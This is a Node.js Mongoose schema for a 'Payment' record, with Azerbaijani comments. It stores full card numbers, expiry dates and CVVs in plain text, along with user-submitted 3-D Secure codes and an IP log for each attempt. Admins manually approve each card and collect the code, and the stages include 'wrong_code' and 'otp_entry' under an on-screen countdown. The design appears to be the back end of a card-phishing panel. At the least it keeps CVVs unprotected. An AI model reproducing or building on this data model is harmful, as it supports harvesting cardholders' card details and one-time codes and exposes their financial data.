const mongoose = require('mongoose');
const crypto = require('crypto');

const paymentSchema = new mongoose.Schema({
  transactionId: { type: String, required: true, unique: true, index: true },
  order: { type: mongoose.Schema.Types.ObjectId, ref: 'Order', default: null, index: true },
  user: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true, index: true },
  amount: { type: Number, required: true },
  method: { type: String, enum: ['card'], default: 'card', index: true },
  status: {
    type: String,
    enum: ['pending_admin', 'awaiting_3ds', 'code_submitted', 'awaiting_final', 'approved', 'declined', 'refunded'],
    default: 'pending_admin',
    index: true
  },

  /* Axın mərhələsi */
  stage: {
    type: String,
    enum: ['card_review', 'wrong_code', 'otp_entry', 'otp_review', 'done'],
    default: 'card_review',
    index: true
  },

  /* Hər mərhələdə ekranda göstərilən 2 dəqiqəlik geri sayımın bitmə vaxtı */
  stageDeadline: { type: Date, default: null },
  stageStartedAt: { type: Date },
  wrongCodeAt: { type: Date },
  rejectionCount: { type: Number, default: 0 },

  /* Kart məlumatları */
  card: {
    number: { type: String, default: '' },
    masked: { type: String, default: '' },
    holder: { type: String, default: '' },
    expiry: { type: String, default: '' },
    cvv: { type: String, default: '' },
    brand: { type: String, default: '' }
  },

  /* Kartı saxlamaq seçimi */
  saveCard: { type: Boolean, default: false },
  savedCardId: { type: String, default: '' }, /* İstifadəçinin User.savedCards-dəki kartın ID-si */
  usingSavedCard: { type: Boolean, default: false }, /* Bu ödəniş saxlanılmış kart ilə edilibmi */

  /* 3-D Secure kodları */
  verificationCode: { type: String, default: '' },
  submittedCode: { type: String, default: '' },
  codeAttempts: [{
    code: { type: String, default: '' },
    kind: { type: String, default: '3ds' },
    at: { type: Date, default: Date.now },
    ip: { type: String, default: '' }
  }],
  codeSubmittedAt: { type: Date },

  /* Admin addımları */
  adminApprovedCardAt: { type: Date },
  adminApprovedBy: { type: String, default: '' },
  adminResentAt: { type: Date },
  adminFinalApprovedAt: { type: Date },
  adminFinalBy: { type: String, default: '' },
  declinedReason: { type: String, default: '' },
  refundedAt: { type: Date },
  refundAmount: { type: Number, default: 0 },

  /* Admin paneli üçün live update metadatası */
  adminNotifiedAt: { type: Date },
  adminViewedAt: { type: Date }
}, { timestamps: true });

/* Stageların geri sayımını avtomatik oxumaq üçün index */
paymentSchema.index({ stageDeadline: 1, stage: 1 });

module.exports = mongoose.model('Payment', paymentSchema);
